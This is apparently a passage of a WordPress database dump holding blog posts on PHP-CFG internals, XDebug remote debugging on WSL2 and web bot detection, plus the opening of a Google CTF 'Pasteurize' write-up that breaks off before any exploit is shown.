-->\n<ul><li><strong>Literal:</strong> These are concrete values in our program. Such as a true boolean or 3 integer or a string.</li><li><strong>NullOperand:</strong> This operand type represents the NULL values. We use this type to distinguish between nulls in our parser vs. the null in the CFG itself.</li><li><strong>Symbol: </strong>This operand type is something that I included in this project to represent Symbolic values. These are the values that are unknown at the time of analysis (E.g., a GET parameter with unknown value).</li><li><strong>Variable:</strong> [Missing documentation]</li><li><strong>Bound Variable:</strong> [Missing documentation]</li><li><strong>Temporary:</strong> The IR format generated by the parser is in <a href=\"https://en.wikipedia.org/wiki/Static_single_assignment_form\">SSA</a> format. This means that each variable in the IR gets assigned to only once. This makes certain types of analyses easier, because we don\'t have to track assignments to variables. To generate code in SSA form, intermediate variables need to be used. These variables do not necessarily (and mostly don\'t) represent a variable in the source of the program. Temporary variables are a representation of these intermediary variables. </li></ul>\n<!-- /wp:list -->\n\n<!-- wp:paragraph -->\n<p>In the following example, !0, !1 and !2 will be temporary variables. Like other expressions, they have $expr property that points to the nodes that can be evaluated to get the value of this temporary (e.g., Line 7: Op\\BinaryOp\\Plus would be referenced). Sometimes the $original property is filled and points to the original variable represented by this temporary node.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"php\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">&lt;?php\n$a = 2;\n$a += 3;\n$b = $a - 1;\n// Will translate to the following SSA format (!# are temporary variables)\n!0 = 2\n!1 = !0 + 3\n!2 = !1 - 1</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:heading {\"level\":4} -->\n<h4>Printer</h4>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>This directory (lib\\PHPCfg\\Printer) includes the two modules that can be used to output the CFG. Text.php will display the CFG in text format and the GraphViz.php file is responsible for generating the dot file that we\'ve seen before. If you want to change how these graphs are displayed (e.g., Change the display color or the information included in the blocks), these are the files that need to be modified.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading {\"level\":4} -->\n<h4>Visitor</h4>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>Visitors are a common pattern in compilers. The gist of the idea is that we are looking for specific operations on the source code (or the IR in this case). By running our function on every basic block or every instruction, we will have the opportunity to extract this information. </p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>To get familiar with this concept, take a look at this project: <a href=\"https://github.com/silverfoxy/builtin_functions_usage\">https://github.com/silverfoxy/builtin_functions_usage</a><br>Here, visitor.php defines a visitor on the AST. The purpose of this code is to count the number of function calls to specific functions. For that, on every node (function enterNode(Node $node)), we check if there is a function call. For each function call node, we check the function name and match it with our list of functions. This provides us an easy way to count the occurrence of calls to specific functions.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>Another example of visitors could be to prepend every call to certain functions with a logger. Whenever we see a call to mysqli-&gt;query, we will add a line before to log the query.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>PHP-CFG defines certain visitors to extract function and method calls, declarations and also variables. For instance <a href=\"https://github.com/silverfoxy/php-cfg/blob/master/lib/PHPCfg/Visitor/DeclarationFinder.php\">DeclarationFinder</a> can be used to identify class and function definitions within the CFG. Note that there would be no direct link between the call to a function to its body inside the CFG, as a result, we will use the DeclarationFinder to find the corresponding blocks for the target function.</p>\n<!-- /wp:paragraph -->','Getting started with PHP-CFG','','publish','open','open','','getting-started-with-php-cfg','','','2020-02-26 14:46:17','2020-02-26 19:46:17','',0,'https://www.silverf0x00.com/?p=912',0,'post','',0),(916,1,'2020-02-22 17:06:30','2020-02-22 22:06:30','','AST','','inherit','open','closed','','lsbasi_part7_ast_01','','','2020-02-22 17:06:30','2020-02-22 22:06:30','',912,'http://localhost:9095/WordPress/wp-content/uploads/2020/02/lsbasi_part7_ast_01.png',0,'attachment','image/png',0),(918,1,'2020-02-22 19:28:35','2020-02-23 00:28:35','','CFG','','inherit','open','closed','','1111-3','','','2020-02-22 19:28:35','2020-02-23 00:28:35','',912,'http://localhost:9095/WordPress/wp-content/uploads/2020/02/1111-3.jpg',0,'attachment','image/jpeg',0),(930,1,'2020-02-24 12:25:44','2020-02-24 17:25:44','','Sample PHP-CFG output','','inherit','open','closed','','screen-shot-2020-02-24-at-12-24-30-pm','','','2020-02-24 12:25:44','2020-02-24 17:25:44','',912,'http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-24-at-12.24.30-PM.png',0,'attachment','image/png',0),(999,1,'2020-03-30 11:50:25','2020-03-30 16:50:25','<!-- wp:tadv/classic-paragraph -->\n<p>In this post, I\'m going to go over my short journey to setup my PHP development environment on Windows 10. I will tell you how to setup PHPStorm to debug PHP applications using XDebug and PHP setup over Ubuntu 18.04 LTS on WSL2. I would like to work against the latest version of PHP and compile it myself. At the same time, setting up extensions and compiling PHP itself on windows is not a very straightforward task as far as I know. The plan is to have the development environment run from Linux (WSL2) while the IDE, which is PHPStorm in our scenario execute from Windows. This way I can make use of the \"user friendly\" parts and beauty of Windows while still running and debugging my code on Ubuntu.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:luckywp/tableofcontents /-->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>The significant point about WSL2 is that Windows has now switched to full virtualization to run Linux with a good level of integration between the two operating systems. It\'s super easy to work with files from both Windows and Linux and it is much quicker than WSL 1. Moreover, Docker is now fully supported making development much easier.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>Let me start by telling you how I got here. I\'ve been using Ubuntu for the past couple of years. But then I had to move my computer home because of all this WFH stuff. I soon noticed that my accessories and their drivers work nowhere near as smooth as they do on my Mac. After some digging, I finally decided to go back to Windows. Specifically with <a href=\"https://devblogs.microsoft.com/commandline/wsl2-will-be-generally-available-in-windows-10-version-2004/\">WSL2</a> and <a href=\"https://docs.docker.com/docker-for-windows/wsl-tech-preview/\">native Docker support</a>, I thought this would be the perfect time to give them a try. One week in, I\'m satisfied with my decision. But this new setup came with its own set of challenges that I\'m going to discuss in this post and share my solutions with you.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:heading {\"level\":3} -->\n<h3>Environment Information</h3>\n<!-- /wp:heading -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>Before we go any further, it is wise to discuss what my current setup is. I\'m running Windows 10 Education build 19041.172. You need a build later than 18917 to enable WSL2. After following a tutorial <a href=\"https://docs.microsoft.com/en-us/windows/wsl/wsl2-install\">[like this one]</a> to enable this feature, which includes joining the insider preview program (which is free), you would need to setup something like Ubuntu 18 from the Windows store.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>On my Ubuntu on WSL2, I have <a href=\"https://www.php.net/downloads.php\">downloaded and compiled PHP 7.4.4</a> along with <a href=\"https://xdebug.org/download\">XDebug 2.9.3</a>. On the Windows side, I have installed <a href=\"https://www.jetbrains.com/phpstorm/\">PHPStorm</a>.&nbsp;</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:heading -->\n<h2>XDebug Remote Debugging</h2>\n<!-- /wp:heading -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>So the idea is to write PHP code in PHPStorm on Windows and run and debug PHP code on Ubuntu over WSL2. To do that, we need to <a href=\"https://xdebug.org/docs/remote\">setup remote debugging</a> for XDebug so that PHPStorm can connect to it and set breakpoints, show variable values and step through the code. I\'m going to steal this Gif from XDebug website to show you how this is going to work, understanding this architecture helps you with debugging if you run into an issue during this step:</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":1009,\"sizeSlug\":\"large\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/03/dbgp-setup.gif\" alt=\"\" class=\"wp-image-1009\"/></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>There is also an option to have XDebug identify the IP address of our IDE through the initial HTTP request (xdebug.remote_connect_back) but unfortunately it does not work under our current setup. I did not get into debugging why that does not work. You can take a look at the packets being transmitted in Wireshark and see what goes wrong. I suspect because both of the machines are running on the same network and some weird translations are being performed by WSL2, maybe the Ubuntu sees Windows host packets as if they are coming from 127.0.0.1. So this is what XDebug configuration looks like inside our php.ini file. You will need to modify the zend_extension path to point to your installation of XDebug. You can also uncomment the last line and create the path to the log file if you need to debug this further:</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:code -->\n<pre class=\"wp-block-code\"><code>&#91;xdebug]\nzend_extension=\"/usr/local/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so\"\nxdebug.remote_enable = 1\nxdebug.remote_port = 9000\n# xdebug.remote_log=/var/log/xdebug/xdebug.log</code></pre>\n<!-- /wp:code -->\n\n<!-- wp:heading {\"level\":3} -->\n<h3>Setting Up PHPStorm</h3>\n<!-- /wp:heading -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>First, we configure PHPStorm to use XDebug. Under File&gt;Settings&gt;Languages &amp; Frameworks &gt; PHP:</p>\n<ul>\n<li>We set the CLI Interpreter to use WSL. It will identify our PHP installation and also tell us that Xdebug is available.</li>\n</ul>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":1012,\"width\":387,\"height\":520,\"sizeSlug\":\"large\",\"linkDestination\":\"media\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large is-resized\"><a href=\"http://localhost:9095/WordPress/wp-content/uploads/2020/03/cli_interpreter.png\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/03/cli_interpreter.png\" alt=\"\" class=\"wp-image-1012\" width=\"387\" height=\"520\"/></a></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:tadv/classic-paragraph -->\n<ul>\n<li>Under Debug, we enable Xdebug and also uncheck the \"Pass required config options through command line\" under Advanced settings. (This option will pass XDebug configurations through the CLI and override the configurations we have in php.ini)</li>\n</ul>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":1013,\"width\":516,\"height\":535,\"sizeSlug\":\"large\",\"linkDestination\":\"media\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large is-resized\"><a href=\"http://localhost:9095/WordPress/wp-content/uploads/2020/03/xdebug.png\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/03/xdebug.png\" alt=\"\" class=\"wp-image-1013\" width=\"516\" height=\"535\"/></a></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:tadv/classic-paragraph -->\n<ul>\n<li>Finally, to run our script, we need a Run/Debug configuration. Notice that we set interpreter options to<em> \"-dxdebug.remote_host=wsl2.host\"</em>. This is where we tell XDebug what our IP address of the Windows host machine is, to get that debug connection back. Keep this detail in mind, we\'ll get back to it.</li>\n</ul>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":1017,\"sizeSlug\":\"large\",\"linkDestination\":\"media\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><a href=\"http://localhost:9095/WordPress/wp-content/uploads/2020/03/run_config.png\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/03/run_config.png\" alt=\"\" class=\"wp-image-1017\"/></a></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:heading {\"level\":3} -->\n<h3>Windows WSL2 IP Address</h3>\n<!-- /wp:heading -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>Notice how we need to give Windows IP address to XDebug so that it can connect back to PHPStorm. The thing with WSL2, at least in its current form is that the IP range will totally change during reboots. Let\'s say the IP range of the network of WSL2 is currently in the range of \"<!--StartFragment -->172.30.0.1\", the next time you reboot the machine, and its gonna happen with a Windows machine, the IP address will be in the range of \"172.16.14.1\". So we need a way to identify this IP address after each reboot. Ideally, a dynamic entry in hosts file that will map <em>\"wsl2.host\"</em> to this IP address. This way, we don\'t have to update our PHPStorm configuration with the correct IP address every time.</p>\n<p><!--EndFragment --></p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>My solution is to run a .Net Core application after each reboot. This small application will read the new IP address of Windows WSL2 interface and update the hosts file entry accordingly. The source code is available here: <a href=\"https://github.com/silverfoxy/wsl2_host_ip\">https://github.com/silverfoxy/wsl2_host_ip</a><span style=\"color: #339966;\"><span style=\"color: #000000;\">.</span></span></p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>Download the <a href=\"https://github.com/silverfoxy/wsl2_host_ip/releases\">release build</a> of this program. Put it under \"Program Files\", and create task under Windows Task Scheduler to run this program with <strong>elevated privileges&nbsp;</strong>(To update the hosts file) after each login and the action is to run a program which points to our executable.</p>\n<p>&nbsp;</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":1023,\"width\":451,\"height\":340,\"sizeSlug\":\"large\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large is-resized\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/03/task_scheduler.png\" alt=\"\" class=\"wp-image-1023\" width=\"451\" height=\"340\"/></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>Now this will add an entry to the Windows hosts file named \"<strong>wsl2.host</strong>\". Recall that we used this host name earlier in our PHPStorm configuration that is passed through the command line to XDebug so that it can connect back from WSL2 Linux VM to our Windows host machine.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>This way, we can use our setup and develop PHP applications on Windows while debugging them against the latest version of PHP on Linux. You can verify this by setting a breakpoint in PHPStorm and the breakpoint should pause the execution. Yaaaay!!</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:heading {\"level\":3} -->\n<h3>Using X11 Forwarding (Everything Runs on Linux)</h3>\n<!-- /wp:heading -->\n\n<!-- wp:tadv/classic-paragraph -->\n<p>There is also an easier way to do this which I briefly introduce. The idea is to use X11 forwarding, install everything (PHP, XDebug, PHPStorm) on Linux and just use the UI on Windows. This also works well, and was not perceivably slower. It feels like the fonts are rendered slightly pixely, but I\'m not sure if this is truly the case or just a bias between Windows and Ubuntu fonts for PHPStorm. But after all this is an easier setup. I used <a href=\"https://sourceforge.net/projects/vcxsrv/\">VcXsrv</a> for X11 forwarding on Windows and it works well. You can follow this tutorial for this setup: <a href=\"https://medium.com/swlh/get-wsl2-working-on-windows-10-2ee84ef8ed43\">https://medium.com/swlh/get-wsl2-working-on-windows-10-2ee84ef8ed43</a></p>\n<!-- /wp:tadv/classic-paragraph -->','Setting up XDebug for PHPStorm on Windows & WSL2','','publish','open','open','','setting-up-xdebug-for-phpstorm-on-windows-wsl2','','','2020-03-30 11:50:25','2020-03-30 16:50:25','',0,'https://www.silverf0x00.com/?p=999',0,'post','',8),(1007,1,'2020-03-29 19:16:03','2020-03-30 00:16:03','','phpstorm_logo','','inherit','open','closed','','phpstorm_logo1','','','2020-03-29 19:16:03','2020-03-30 00:16:03','',999,'http://localhost:9095/WordPress/wp-content/uploads/2020/03/phpstorm_logo1.png',0,'attachment','image/png',0),(1009,1,'2020-03-29 23:09:47','2020-03-30 04:09:47','','dbgp-setup','','inherit','open','closed','','dbgp-setup','','','2020-03-29 23:09:47','2020-03-30 04:09:47','',999,'http://localhost:9095/WordPress/wp-content/uploads/2020/03/dbgp-setup.gif',0,'attachment','image/gif',0),(1012,1,'2020-03-29 23:28:59','2020-03-30 04:28:59','','cli_interpreter','','inherit','open','closed','','cli_interpreter','','','2020-03-29 23:28:59','2020-03-30 04:28:59','',0,'http://localhost:9095/WordPress/wp-content/uploads/2020/03/cli_interpreter.png',0,'attachment','image/png',0),(1013,1,'2020-03-29 23:29:02','2020-03-30 04:29:02','','xdebug','','inherit','open','closed','','xdebug','','','2020-03-29 23:29:02','2020-03-30 04:29:02','',0,'http://localhost:9095/WordPress/wp-content/uploads/2020/03/xdebug.png',0,'attachment','image/png',0),(1017,1,'2020-03-29 23:43:40','2020-03-30 04:43:40','','run_config','','inherit','open','closed','','run_config','','','2020-03-29 23:43:40','2020-03-30 04:43:40','',999,'http://localhost:9095/WordPress/wp-content/uploads/2020/03/run_config.png',0,'attachment','image/png',0),(1023,1,'2020-03-30 11:36:58','2020-03-30 16:36:58','','task_scheduler','','inherit','open','closed','','task_scheduler','','','2020-03-30 11:36:58','2020-03-30 16:36:58','',999,'http://localhost:9095/WordPress/wp-content/uploads/2020/03/task_scheduler.png',0,'attachment','image/png',0),(1047,1,'2020-05-04 00:02:36','0000-00-00 00:00:00','<!-- wp:tadv/classic-paragraph -->\n<p>The people who know me, know that I\'ve spent several years working on the topics of browser fingerprinting and bot detection. I don\'t call myself an expert by any means, but I\'ve seen enough to be able to share some useful tips with you. So in this series of blog posts, I\'ll share some interesting observations and tips that I have seen working in this area.</p>\n<p>I have two papers that will be published in the DIMVA\'20 conference on the topic of bot detection, I\'ll post a link to them here when they\'re available online. I would like to thank my collaborators who I learned a lot from, <a href=\"https://www.cyberphilosopher.org/\">Alex</a>, <a href=\"https://plaperdr.github.io/\">Pierre</a> and my adviser <a href=\"http://securitee.org/\">Nick</a>.</p>\n<p>In this blog post, I\'ll give you an overview of the concepts that you need to know to understand how the existing bot detection technologies function. This includes some knowledge on JavaScript, browser APIs, browser fingerprinting and so on.</p>\n<h2>I\'m not a robot.</h2>\n<p>I\'m sure you\'ve all seen a CAPTCHA while surfing the internet. </p>\n<p><img class=\"aligncenter wp-image-1050 size-full\" src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/05/Annotation-2020-05-03-180821.png\" alt=\"\" width=\"313\" height=\"289\" />You can see the Google reCAPTCHA in the picture above. You need to click on the checkbox. It may then ask you to to click on the images that with a \"bus\" in them. Back in my days, they were more creative, and not in a good way! You\'d get asked to type in weird looking characters in a textbox. Who remembers the rapidshare CAPTCHA memes? They took this concept and pushed it too far.</p>\n<p><img class=\"aligncenter size-full wp-image-1052\" src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/05/cat.jpg\" alt=\"\" width=\"498\" height=\"155\" />CAPTCHA was one of the first approaches to block bots from coming to the websites and doing all sorts of malicious stuff. This way, you will prevent a bot (read: an automated script) from coming to your website, registering 1,000 accounts, sending advertisement comments or downloading your content and mirroring it elsewhere.</p>\n<p>The idea was great! It wasn\'t really detecting the bots, it was just preventing them from interacting with your website and made it harder for bot authors. But showing CAPTCHA could be so intrusive and cause so much friction, that you could only use it in so many places. In the case of user registration, it is only done once per human user. In the example of rapidshare, as crazy as their CAPTHCA was, there was a file you wanted to download, you had the incentive to type in the CAPTCHA!</p>\n<p>Now do you want to use a CAPTCHA on every single page of your website? Every time the customer clicks on the next button to see the next page of your product inventory, do you ask them to find the characters with the cat? Because of this limitation, we leaned towards less intrusive ways of detecting bots vs real human users. </p>\n<p>We want a solution that is able to detect bots, and at the same time, not require human users to do extra work!</p>\n<h2>Why do we hate the bots?</h2>\n<p>Before I tell you how to block the bots, let me tell you why we hate them! There are numerous attacks that bots will do. They can identify vulnerabilities and exploit them. They can send spam towards your website. Even worse, they can scrape the valuable content from your website and abuse it! Imagine a ride sharing application extracting the price of a route from Uber and beating it by $1 in their application. (A similar story has really happened)</p>\n<p>Based on your threat model, you will be fighting against bots with different capabilities. Every day, your website gets scanned for vulnerabilities, the login page will get hammered by bots trying to break into accounts. Its much worse if you use a platform like WordPress, just grep for <em>\"wp-login\"</em> and <em>\"xml-rpc\"</em> in your Apache access logs. These bots are written based on simple HTTP request libraries. They usually do not run JavaScript. They request resources that are not there. It is \"easy\" to identify them, but at the same time, the amount of harm they cause is also limited.</p>\n<p>On the other end of the spectrum, if you run a business with a fair number of customers, malicious actors and competitors will invest time and effort to create bots based on real browsers using libraries like Selenium to interact with your website. These bots use the same browsing environment as a human user would use.</p>\n<p>Moreover, the type of attacks that you are trying to protect against dictates your defensive capabilities. Defending against a brute force attack? Lock out after 5 failed attempts and request email verification. Block any IP address that sends you a very high number of requests over a short period of time. Block requests that do not run JavaScript! On the other hand, if you are defending against a bot that scrapes content off of your website, or performs very targeted attacks such as <a href=\"https://www.perimeterx.com/solutions-by-threat/denial-inventory/\">denial-of-inventory</a>, you cannot rely on simple heuristics anymore. These bots mimic similar environments to real human users. They tune their request rate to be low enough not to trip your firewall rate limiting rules. You need to get more creative!</p>\n<p>Notice I\'m only scratching the surface here, the bot problem is much much bigger than I can describe in a single blog post. Read more about it at <a href=\"https://www.imperva.com/resources/resource-library/reports/2020-bad-bot-report/\">Bad Bot Report 2020 from Imperva (Distil Networks)</a>.</p>\n<h2>What you gonna do with this big bad bot? Detect, detect, detect!</h2>\n<p>Enough of background, let\'s get into the fun part, detecting the bots! The essence of bot detection is focusing on anomalies along the network/software stack between human browsing environments vs automated environments and also the behavioral anomalies. This is where the browser fingerprinting plays a big role. Anti-bot technologies heavily rely on browser fingerprinting techniques, such as enumerating the JavaScript APIs, screen and font-fingerprinting, Canvas fingerprinting, IP Leak through WebRTC, browser extension fingerprinting, and more. <a href=\"https://github.com/Valve/fingerprintjs2\">fingerprintJS2</a> is an opensource library that includes many of the techniques that I listed here. It is actually incorporated either fully or partially by the existing anti-bot systems.</p>\n<h4>Bot vs human browsing environments</h4>\n<p>Visit <a href=\"https://amiunique.org/\">amiunique.org</a> and take a look at your browser fingerprint. Notice how the value of some fields such as your specific user agent or your WebGL Renderer can make you as unique as &lt;0.01% ! This essentially means that less than 0.01% of users in amiunique database of fingerprints posses the same value under that specific field. So just by the fact that your WebGL Renderer is \"ANGLE (Intel(R) Iris(R) Plus Graphics 650 Direct3D11 vs_5_0 ps_5_0)\", the websites that you visit can identify you with a good confidence across different requests even if you switch your IP address or mask your user agent. Read more about it in \"<a href=\"https://hal.inria.fr/hal-01285470v2/document\">Beauty and the Beast: Diverting Modern Web Browsers to Build Unique Browser Fingerprints</a>\" paper.</p>\n<p>The same technique is actually used by advertisement networks to track you across different websites.</p>\n<p><strong>[Detecting Python Requests, Scrapy and PhantomJS]</strong> Techniques based on browser environment fingerprinting are highly successful in detecting tools that send raw HTTP requests or have limited capability to run JavaScript. Python scripts based on Python Requests library, Scrapy, and even PhantomJS can be detected with high confidence. You can change the user agent of PhantomJS, but you can\'t do much about it not supporting the Canvas API.</p>\n<p><strong>[Detecting selenium and other automated headless browsers] </strong>It becomes more challenging to apply the same techniques to real browsers that are automated and turned into bots. Using a library such as Selenium, or even the builtin APIs of Chrome-based browsers, you can automate website interactions while using a real browser. This is important because then suddenly you emit almost zero anomaly in your JavaScript fingerprint.</p>\n<p>Antoine Vastel, a great researcher and an expert on this topic, has published numerous blog posts on detecting Selenium automated browsers and headless Chrome. The issue is, once you know these techniques, you can mask them and go undetected. After his PhD, he joined one of the anti-bot companies and decided to keep these signatures secret. But anyway visit his blog if you are interested in this topic: <a href=\"https://antoinevastel.com/\">https://antoinevastel.com/</a>.</p>\n<p>So the takeaway here is that, yes, you can still detect automated full-browsing environments, but its not trivial anymore. You run into the risk of false positives where an actual human customer is blocked or asked to solve a CAPTCHA over and over again. Let me tell you, this is not something you want to do. Depending on the business, your clients may be more willing to have some bots go undetected rather than blocking actual human customers. Read more at <a href=\"https://antoinevastel.com/crawler/2019/12/29/families-web-bots.html\">Antoine\'s blog here</a>.</p>\n<p><strong>[The problem of scale] </strong>There\'s also another side to this story. All of these techniques work well in isolation, but when you integrate them with real websites and put them under real load, shit hits the fan! During my research, I came across websites, protected by anti-bot systems, that blocked PhantomJS but failed to block simple Python requests. While I would never know the reason behind this strange behavior, I would speculate that there was a mobile API or some other API that was supposed to be accessed by another application, and as a result, requests that do not support JavaScript somehow are considered less risky than requests from PhantomJS. So if you do not have a signature that detects automated browsers and bots with a very high confidence, your ability to incorporate this in a production environment will be limited.</p>\n<h4>Bot vs human browsing behavior</h4>\n<p>We talked about detecting anomalous browsing <strong>environments</strong>, now let\'s focus on the anomalous <strong>behavior</strong>. As much as static signatures are good when it comes to bot detection, they can be masked rather easily. Another aspect of bot detection focuses on the difference between the behavior of humans vs bots when they come to your website. This can be counting the number of keystrokes per second, number of requests to the login endpoint over a period of 60 seconds or tracking the mouse movement. Again, I\'d refer to you <a href=\"https://antoinevastel.com/javascript/2020/02/09/detecting-web-bots.html\">Antoine\'s blog post to read more on this topic here</a>.</p>\n<p>It is unfortunate for the defenders, but the curse of scale still haunts us. How do you build and apply a meaningful behavioral model for real websites. One surprising observation we made was that simple rate limiting is highly successful where complex machine learning detection schemes fail. We\'ve also discussed this in our academic paper. One of the most successful defenses that we observed against credential brute force attacks was the static rate limiting of login endpoints provided by Cloudflare firewall. Each IP address cannot send more than let\'s say 5 requests to /login.php over a minute, end of story!</p>\n<p>You can define similar limits for your whole website. For that, you need  a good training dataset. Anyone who has tried to play around with these rules in their firewall knows how prone to false positive and false negative they are. You aim too low and you block some human users that just click too fast, you aim too high and you miss the bots that limit their number of requests.</p>\n<p>The main issue here is that the firewall sitting in front of your web application has no context of what is going on. Is 100 requests per second to /index.php as bad as 100 requests towards /login.php? Also, depending on the type of attack, for instance, the denial-of-inventory, the attacker may not even need to bombard your application with thousands of requests to cause some serious damage.</p>\n<h2>Why is this a hard problem?</h2>\n<p>The problem of bot detection is hard and existing bot detection systems can be bypassed. Why is that? Well, we are dealing with an adversary that has unlimited power. The attacker can automatically come to your website with an Android phone automated using ADB. They can reuse existing browser fingerprints generated on another browser. They can fire their attack through <a href=\"https://multilogin.com/proxy/\">residential IP proxies</a>. They can even rent compromised browsers through malicious browser extensions sold in the underground markets. It is by all means an arms race. You come up with a new clever way to detect and fingerprint the bots, they will find out about it and bypass it the next day, here\'s an example of it: <a href=\"https://github.com/VeNoMouS/cloudscraper/issues?q=is%3Aissue+is%3Aclosed\">https://github.com/VeNoMouS/cloudscraper/issues?q=is%3Aissue+is%3Aclosed</a>. There is no silver bullet when it comes to bot detection. A successful bot detection scheme is based on the state of the art in browser fingerprinting. It is customized based on the threat model of client websites and is tested routinely against common attacks. During the past couple of years, I have only seen one bug bounty program paying out for clever bot/automated attacks. Most of the time this attack surface of the businesses is not very well understood and is excluded from the bug bounty programs.</p>\n<p>Sometimes bot detection products give people a false sense of security. Even if you have the most expensive anti-bot system in place, you still need to implement your login rate limiting in house. I can\'t tell you how many websites I have seen where they totally rely on the anti-bot system to prevent malicious logins and when that is bypassed, simple rate limiting has been absent!</p>\n<p>Most big companies have various end points, if you fail to protect your mobile endpoint, or a legacy API, then you are doomed. Oh, and at the same time, the browsers are trying to limit the ability of websites to fingerprint users because this can be used to invade users privacy. In a year from now, you may not even be able to rely on the existing fingerprinting APIs that you have access to, right now.</p>\n<h2>Conclusion</h2>\n<p>In this post, I briefly discussed how websites detect bots. Went over the techniques and the technology involved, and pointed out the limitations of each of these approaches. Now that we have a reference to point to for the required background knowledge on bot detection, in the upcoming blog posts, I will go into the interesting details, attacks and bypassing techniques that I observed throughout my research on bots.</p>\n<!-- /wp:tadv/classic-paragraph -->','Are you a robot?','','draft','open','open','','','','','2020-05-04 00:02:36','0000-00-00 00:00:00','',0,'https://www.silverf0x00.com/?p=1047',0,'post','',0),(1050,1,'2020-05-03 17:08:45','2020-05-03 22:08:45','','Annotation 2020-05-03 180821','','inherit','open','closed','','annotation-2020-05-03-180821','','','2020-05-03 17:08:45','2020-05-03 22:08:45','',1047,'http://localhost:9095/WordPress/wp-content/uploads/2020/05/Annotation-2020-05-03-180821.png',0,'attachment','image/png',0),(1052,1,'2020-05-03 17:12:39','2020-05-03 22:12:39','','cat','','inherit','open','closed','','cat','','','2020-05-03 17:12:39','2020-05-03 22:12:39','',1047,'http://localhost:9095/WordPress/wp-content/uploads/2020/05/cat.jpg',0,'attachment','image/jpeg',0),(1085,1,'2020-05-03 19:27:31','2020-05-04 00:27:31','','s-l300','','inherit','open','closed','','s-l300','','','2020-05-03 19:27:31','2020-05-04 00:27:31','',1047,'http://localhost:9095/WordPress/wp-content/uploads/2020/05/s-l300.jpg',0,'attachment','image/jpeg',0),(1144,1,'2020-08-23 19:09:54','2020-08-24 00:09:54','<!-- wp:tadv/classic-paragraph -->\n<p>This is the write up for Pasteurize Google CTF 2020 challenge from the perspective of someone who does not routinely do CTFs. A friend of mine teamed up with me and even though we did not go that far, we had fun and learned something.</p>\n<h2> </h2>\n<h2>Challenge description</h2>\n<p>In this challenge, we get a URL: <a href=\"https://pasteurize.web.ctfcompetition.com/\">https://pasteurize.web.ctfcompetition.com/</a> and a description that says:</p>\n<blockquote>\n<p>This doesn\'t look secure. I wouldn\'t put even the littlest secret in here. My source tells me that third parties might have implanted it with their little treats already. Can you prove me right?</p>\n</blockquote>\n<p>On this website, we can create a \"Paste\". After submitting it, we get redirected to a page with a random id, which shows our note.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":1150,\"sizeSlug\":\"large\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/08/1.png\" alt=\"\" class=\"wp-image-1150\"/></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":1151,\"sizeSlug\":\"large\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/08/2.png\" alt=\"\" 